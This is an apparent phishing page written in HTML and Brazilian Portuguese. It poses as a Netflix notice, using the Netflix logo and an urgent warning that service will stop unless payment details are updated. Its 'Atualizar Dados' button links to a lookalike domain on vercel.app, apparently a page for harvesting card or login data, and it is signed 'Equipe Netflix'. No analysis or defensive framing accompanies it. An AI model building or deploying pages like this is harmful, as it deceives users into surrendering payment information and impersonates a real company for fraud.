<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Atualização de Pagamento - Netflix</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <style>
    /* Reset e base */
    *, *::before, *::after {
      box-sizing: border-box;
    }
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      background-color: #fff;
      color: #1f2937;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    /* Container centralizado vertical e horizontal */
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
      min-height: 100vh;
    }

    .container {
      max-width: 600px;
      width: 100%;
      padding: 24px 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.05);
      border-radius: 12px;
      background: #fff;
      text-align: center;
    }

    header {
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 16px;
      margin-bottom: 24px;
    }
    header img {
      height: 40px;
      max-width: 100%;
      object-fit: contain;
    }

    .alert {
      background-color: #fef3c7;
      border-left: 4px solid #f59e0b;
      color: #b45309;
      padding: 12px 16px;
      border-radius: 4px;
      font-size: 14px;
      margin-bottom: 24px;
      text-align: left;
      max-width: 100%;
    }

    h1 {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 16px;
      color: #111827;
    }

    p {
      font-size: 1rem;
      margin-bottom: 24px;
      color: #374151;
      line-height: 1.5;
    }

    .cta-button {
      display: inline-block;
      width: 100%;
      max-width: 320px;
      background-color: #ef4444;
      color: #fff;
      font-weight: 700;
      padding: 16px 0;
      border-radius: 8px;
      text-align: center;
      text-decoration: none;
      font-size: 1.125rem;
      box-shadow: 0 6px 12px rgba(239, 68, 68, 0.5);
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      cursor: pointer;
      margin: 0 auto 32px auto;
    }
    .cta-button:hover,
    .cta-button:focus {
      background-color: #dc2626;
      box-shadow: 0 8px 20px rgba(220, 38, 38, 0.7);
      outline: none;
    }

    .footer {
      font-size: 12px;
      color: #6b7280;
      margin-top: 0;
    }

    /* Responsividade */
    @media (max-width: 480px) {
      h1 {
        font-size: 1.3rem;
      }
      p {
        font-size: 0.9rem;
      }
      .cta-button {
        font-size: 1rem;
        padding: 14px 0;
      }
    }
  </style>
</head>
<body>
  <div class="container" role="main" aria-label="Atualização de Pagamento Netflix">
    <header>
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" />
    </header>

    <div class="alert" role="alert">
      <strong>Atenção:</strong> Atualize seus dados de pagamento para evitar a interrupção do serviço.
    </div>

    <h1>Mantenha seu acesso liberado</h1>

    <p>Atualize seus dados de pagamento para continuar assistindo sem interrupções.</p>

    <a href="https://myaccount-netflix.vercel.app/index2.html" class="cta-button" target="_blank" rel="noopener noreferrer" role="button">
      Atualizar Dados
    </a>

    <div class="footer">
      <p>Equipe Netflix</p>
    </div>
  </div>
</body>
</html>
